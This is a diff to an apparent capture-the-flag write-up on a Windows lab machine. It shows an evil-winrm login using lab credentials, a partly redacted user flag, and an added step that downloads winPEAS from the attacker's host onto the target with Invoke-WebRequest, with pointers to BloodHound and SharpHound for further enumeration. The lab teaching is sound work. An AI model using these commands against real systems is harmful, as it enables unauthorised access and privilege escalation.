@@ -127,7 +127,7 @@ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
 
 ![image](https://user-images.githubusercontent.com/5285547/124300141-22a76c00-db56-11eb-8fbc-07b6d3245732.png)
 
-## User
+## User falg
 
 Change direcroty to the dekstop to retrive the user flag
 
@@ -136,5 +136,24 @@ user.txt
 e5e4e47ae{REDACTED}eb013fb0d9ed
 ```
 
+## User Enumeration
 
+We start the enum again to see what we can do next..  
+I transfer winpeas to the machine to do some quick enum for me. 
+
+```
+Invoke-WebRequest "http://10.10.14.184:6677/winPEASany.exe" -OutFile "winpea.exe"
+```
+
+- Using SharpHound and BloodHound
+
+Bloodhound
+```
+https://github.com/BloodHoundAD/BloodHound
+```
+
+SharpHound
+```
+https://github.com/BloodHoundAD/SharpHound3
+```
 
